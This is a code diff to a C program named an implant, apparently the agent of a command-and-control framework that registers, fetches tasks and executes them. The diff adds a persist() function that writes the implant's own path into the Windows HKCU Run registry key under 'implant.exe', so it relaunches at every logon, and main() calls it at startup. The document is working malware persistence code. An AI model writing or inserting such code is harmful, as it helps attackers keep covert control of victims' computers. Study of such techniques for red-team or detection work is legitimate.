@@ -113,6 +113,40 @@ void getTasksAndExecute() {
     }
 }
 
+// using run key to make implant run on start up
+void persist() {  
+    char exepath[MAX_PATH];
+    GetModuleFileNameA(0, exepath, MAX_PATH);
+
+    printf("executable path: %s\n", exepath);
+
+    HKEY hKey;
+    LSTATUS status = RegOpenKeyA(
+        HKEY_CURRENT_USER,
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        &hKey
+    );
+
+    if (status != ERROR_SUCCESS) {
+        printf("Error %d: unable to open key\n", status);
+    }
+
+    status = RegSetValueExA(
+        hKey,
+        "implant.exe",
+        0,
+        REG_SZ,
+        (BYTE*)exepath,
+        strlen(exepath)
+    );
+
+    if (status != ERROR_SUCCESS) {
+        printf("Error %d: unable to set key\n", status);
+    }
+
+    RegCloseKey(hKey);
+}
+
 int main(int argc, char* argv[]){
 
     // use a mutex to prevent multiple instances of the implant
@@ -124,6 +158,8 @@ int main(int argc, char* argv[]){
         return 0; // Exit program
     }
 
+    persist();
+    
     agentId = generateRandomId(10);
     BOOL registered = FALSE;
     do {
